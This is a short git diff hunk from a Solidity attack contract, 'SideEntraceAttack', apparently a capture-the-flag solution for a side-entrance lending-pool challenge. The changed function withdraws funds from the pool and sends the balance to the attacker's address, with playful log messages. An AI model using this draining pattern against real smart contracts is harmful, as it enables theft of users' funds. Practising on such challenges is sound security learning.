@@ -51,7 +51,8 @@ contract SideEntraceAttack {
     }
 
     function printMoney() external {
-        IPoolFunc(pool).withdraw();
+        console.log("Starting printer");
+        pool.withdraw();
         console.log("BBRRRTTTT");
         address(attacker).send(balance);
 
